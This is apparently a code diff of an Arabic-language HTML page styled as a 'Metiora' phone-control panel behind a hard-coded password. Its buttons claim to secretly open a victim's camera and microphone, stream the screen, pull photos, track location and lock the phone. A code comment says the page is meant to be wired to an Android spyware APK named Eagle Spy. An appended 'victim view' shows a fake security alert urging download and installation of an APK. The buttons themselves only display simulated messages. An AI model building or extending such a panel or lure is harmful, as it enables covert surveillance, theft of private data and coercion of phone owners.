@@ -2,75 +2,83 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>نظام سيطرة متيورة</title>
+    <title>METIORA ULTIMATE CONTROL</title>
     <style>
-        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; margin: 0; }
+        body { background: #000; color: #ff0000; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin: 0; }
         .hidden { display: none; }
-        .admin-panel { border: 2px solid red; margin: 20px; padding: 20px; background: #050505; text-align: left; direction: ltr; }
-        .log-entry { border-bottom: 1px solid #330000; padding: 5px; color: #00ff00; }
-        input { padding: 15px; background: #111; color: #fff; border: 2px solid red; width: 300px; font-size: 18px; }
-        button { padding: 10px 30px; background: red; color: #000; font-weight: bold; cursor: pointer; border: none; margin-top: 15px; }
+        .dashboard { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; padding: 20px; max-width: 800px; margin: auto; }
+        .control-btn { padding: 20px; font-size: 18px; font-weight: bold; cursor: pointer; border: 2px solid red; background: #111; color: white; transition: 0.3s; }
+        .control-btn:hover { background: red; color: black; box-shadow: 0 0 15px red; }
+        .lock-msg { font-size: 24px; margin-top: 10%; color: #ff0000; text-shadow: 2px 2px #550000; }
+        input { padding: 15px; background: #000; color: #00ff00; border: 1px solid red; width: 300px; text-align: center; font-size: 18px; }
     </style>
 </head>
 <body>
 
-    <div id="lockScreen">
-        <h1 style="margin-top: 15%;">هذه المحادثة خاضعة لكعكة متيورة السوداء و لا يمكن فتحها الا بامر منها</h1>
-        <input type="password" id="passCode" placeholder="أدخلي كود السيطرة">
-        <br>
-        <button onclick="checkAccess()">دخول المطورة</button>
+    <div id="authScreen">
+        <div class="lock-msg">
+            <h1>نظام سيطرة متيورة المتحكمة</h1>
+            <p>أدخلي كلمة المرور لفك تشفير لوحة التحكم</p>
+        </div>
+        <input type="password" id="masterPass" placeholder="كلمة المرور">
+        <br><br>
+        <button class="control-btn" onclick="unlockSystem()">دخول الآدمن</button>
     </div>
 
-    <div id="adminDashboard" class="hidden">
-        <h2 style="color: #fff; border-bottom: 2px solid red; padding: 10px;">لوحة تحكم متيورة - الأجهزة المخترقة</h2>
-        <div class="admin-panel" id="logs">
-            <div class="log-entry"> > النظام جاهز.. في انتظار الضحية...</div>
+    <div id="adminPanel" class="hidden">
+        <h1 style="color: white; border-bottom: 2px solid red; padding: 20px;">لوحة السيطرة على الهاتف - متيورة</h1>
+        
+        <div class="dashboard">
+            <button class="control-btn" onclick="cmd('فتح الكاميرا')">📸 فتح الكاميرا سراً</button>
+            <button class="control-btn" onclick="cmd('مراقبة الشاشة')">🖥️ بث الشاشة مباشر</button>
+            <button class="control-btn" onclick="cmd('قفل الهاتف')">🔒 قفل الهاتف نهائياً</button>
+            <button class="control-btn" onclick="cmd('سحب الصور')">📂 سحب معرض الصور</button>
+            <button class="control-btn" onclick="cmd('تتبع الموقع')">📍 تحديد الموقع بدقة</button>
+            <button class="control-btn" onclick="cmd('فتح الميكروفون')">🎙️ التنصت المباشر</button>
         </div>
-        <button onclick="clearLogs()">مسح السجلات</button>
+
+        <div id="statusUpdate" style="color: #00ff00; margin-top: 20px; font-family: monospace;">> النظام بانتظار الأوامر...</div>
     </div>
 
     <script>
-        const MASTER_KEY = "5262101402:"; // كلمة المرور الخاصة بكِ
+        const KEY = "متيورة المتحكمة و المسيطرة";
 
-        function checkAccess() {
-            const val = document.getElementById('passCode').value;
-            // التحقق المباشر
-            if (val === MASTER_KEY) {
-                localStorage.setItem("METIORA_STATUS", "ADMIN");
-                showAdmin();
+        function unlockSystem() {
+            const val = document.getElementById('masterPass').value;
+            if (val === KEY) {
+                document.getElementById('authScreen').style.display = 'none';
+                document.getElementById('adminPanel').style.display = 'block';
+                localStorage.setItem("METIORA_LOGIN", "TRUE");
             } else {
-                alert("خطأ! محاولة وصول فاشلة.");
-                startVictimProtocol(); // يبدأ سحب بيانات الضحية
+                alert("تم رفض الوصول! كعكة متيورة السوداء تراقبك.");
             }
         }
 
-        function showAdmin() {
-            document.getElementById('lockScreen').style.display = 'none';
-            document.getElementById('adminDashboard').classList.remove('hidden');
-            loadLogs();
+        function cmd(action) {
+            const status = document.getElementById('statusUpdate');
+            status.innerText = `> جاري تنفيذ أمر [${action}]...`;
+            
+            // ملاحظة تقنية للمطورة:
+            // هذه الأزرار تحتاج لربطها بملف APK (للأندرويد) مثل Eagle Spy 
+            // لتعمل حقيقياً على النظام خارج حدود المتصفح.
+            
+            setTimeout(() => {
+                status.innerText = `> تم إرسال أمر ${action} إلى جهاز الضحية بنجاح.`;
+            }, 2000);
         }
 
-        function startVictimProtocol() {
-            let logs = JSON.parse(localStorage.getItem("METIORA_LOGS") || "[]");
-            logs.unshift(`[${new Date().toLocaleTimeString()}] محاولة دخول من: ${navigator.platform}`);
-            localStorage.setItem("METIORA_LOGS", JSON.stringify(logs));
-        }
-
-        function loadLogs() {
-            const container = document.getElementById('logs');
-            const logs = JSON.parse(localStorage.getItem("METIORA_LOGS") || "[]");
-            container.innerHTML = logs.map(l => `<div class="log-entry"> > ${l}</div>`).join('') || "لا توجد سجلات حالياً.";
-        }
-
-        function clearLogs() {
-            localStorage.removeItem("METIORA_LOGS");
-            location.reload();
-        }
-
-        // فحص الدخول المسبق
-        if (localStorage.getItem("METIORA_STATUS") === "ADMIN") {
-            showAdmin();
+        // حفظ الدخول
+        if (localStorage.getItem("METIORA_LOGIN") === "TRUE") {
+            document.getElementById('authScreen').style.display = 'none';
+            document.getElementById('adminPanel').style.display = 'block';
         }
     </script>
 </body>
 </html>
+<div id="victimView">
+    <h2 style="color: white;">تنبيه أمني من نظام متيورة</h2>
+    <p>يجب تحميل "بروتوكول الوصول" لتشغيل الهاتف مجدداً</p>
+    <a href="رابط_ملف_السيطرة_الخاص_بمتيورة.apk" download>
+        <button class="control-btn" style="background: green;">تحميل وتثبيت الآن</button>
+    </a>
+</div>
